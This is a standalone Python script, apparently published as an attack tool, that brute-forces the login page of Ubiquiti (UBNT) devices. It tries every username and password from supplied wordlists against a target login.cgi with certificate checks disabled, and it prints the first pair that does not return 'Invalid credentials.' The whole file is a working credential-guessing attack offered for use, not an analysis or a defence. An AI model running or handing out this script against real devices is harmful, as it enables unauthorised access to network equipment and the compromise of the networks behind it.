#!/usr/bin/python3
import requests
import urllib3
import argparse

info = argparse.ArgumentParser(description="Specify target and Username and Password")
info.add_argument("-t", "--target", dest="url", help="[+] Specify url target ", type=str,)
info.add_argument("-u", "--username", dest="username", help="[+] Specify username list")
info.add_argument("-p", "--password", dest="password", help="[+] Specify password list")
option = info.parse_args()
if not option.url:
    print("[+] Specify url target: example -t <https://127.0.0.1/login.cgi>")
if not option.username:
    print("[+] Specify username list: example -u <your list>")
if not option.password:
    print("[+] Specify password list: example -p <your list>")
    exit()

print("Author: MR KY")
print("twitter: @mr_ky_1")
print("Title: bruteforce ubnt device login page")
print("Date: 18-7-2021")
print("Version: v1.0")
print("Tested on: < v6.3.5")

urllib3.disable_warnings()

url = option.url

us_file = str(option.username)

usernames = open(us_file, "r").readlines()

for line in usernames:
    usernames = line.strip()
    ps_file = str(option.password)
    passwords = open(ps_file, "r").readlines()

    for lines in passwords:
        passwords = lines.strip()
        data = {"username": usernames, "password": passwords}
        r = requests.post(url, verify=False, data=data)
        c = r.text
        if "Invalid credentials." in c:
            print("trying " + usernames + " and " + passwords)
        else:
            print("username is: "+usernames + "\npassword is: "+passwords)
            exit()
print("..WRONG USERNAME OR PASSWORD..")